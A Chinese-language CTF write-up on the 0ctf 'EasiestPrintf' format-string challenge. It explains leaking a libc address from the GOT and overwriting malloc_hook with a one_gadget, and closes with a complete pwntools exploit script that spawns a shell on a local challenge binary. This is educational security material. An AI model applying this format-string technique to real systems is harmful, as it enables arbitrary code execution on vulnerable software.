---
title: 格式化字符串漏洞利用实战之 0ctf-easyprintf
authorId: hac425
tags:
  - format string
categories:
  - ctf
date: 2017-12-17 18:20:00
---
### 前言

这是 `0ctf` 的一道比较简单的格式化串的题目。



### 正文


逻辑非常简单

![paste image](http://oy9h5q2k4.bkt.clouddn.com/1513506132721kaldyhzb.png?imageslim)

`do_read` 可以打印内存地址的数据，可用来 泄露 `got`.

![paste image](http://oy9h5q2k4.bkt.clouddn.com/1513506205821m9i5ym56.png?imageslim)

`leave` 格式化字符串漏洞。

![paste image](http://oy9h5q2k4.bkt.clouddn.com/1513506227980602voj1w.png?imageslim)

`printf(s)` 直接调用 `exit` 退出了。不过可以使用 `%1000c` 触发 `printf` 里面的 `malloc` 和 `free`, 所以思路很清楚了，修改 `free_hook` 或者 `malloc_hook` 为 `one_gadget`, 并且在格式化串末尾加上 `%1000c`触发 `malloc` 和 `free`


![paste image](http://oy9h5q2k4.bkt.clouddn.com/1513506399803fdtgne0f.png?imageslim)

### 最后
最开始修改 `free_hook`, 发现所有的 `one_gadget` 都不能用，后面使用了 `malloc_hook` ，终于找到一个可以用的，估计和寄存器的数据有关。


exp:

```
from pwn import *
context(os='linux',log_level='debug')


p = process("./EasiestPrintf")

# gdb.attach(p, '''

# c

# 	''')

setvbuf_got = 0x08049FF0 
exit_got = 0x08049FE4

pause()
p.sendline(str(setvbuf_got))
p.recvuntil("Which address you wanna read:\n")
setvbuf_addr = int(p.recv(len('0xf7e60360')), 16)
libc_addr = setvbuf_addr - 0x60360
free_hook = libc_addr + 0x1b38b0
malloc_hook = libc_addr + 0x1b2768
one_gadget = libc_addr + 0x3ac69
log.info("free_hook: " + hex(free_hook))
log.info("one_gadget: " + hex(one_gadget))
pause()

payload = fmtstr_payload(7, {malloc_hook: one_gadget})  
payload +=  "%100000c"

p.sendline(payload)
p.interactive()

```















